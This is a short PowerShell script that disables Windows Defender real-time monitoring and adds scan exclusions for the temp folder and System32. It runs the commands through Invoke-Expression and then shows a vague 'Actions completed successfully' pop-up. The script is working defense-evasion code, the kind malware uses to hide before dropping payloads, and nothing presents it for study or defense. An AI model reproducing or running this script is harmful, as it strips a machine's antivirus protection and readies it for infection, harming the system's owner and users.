# Variables for actions
$DefenderPreferences = @(
    "Set-MpPreference -DisableRealtimeMonitoring $true",
    "Set-MpPreference -ExclusionPath '%TEMP%', 'C:\Windows\System32'"
)

# Log the current process and status
Write-Output "Starting background actions..."

# Disable real-time monitoring and add exclusions
Invoke-Expression ($DefenderPreferences -join "; ")

# Notification for completion
[System.Windows.Forms.MessageBox]::Show("Actions completed successfully.", "Notification", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
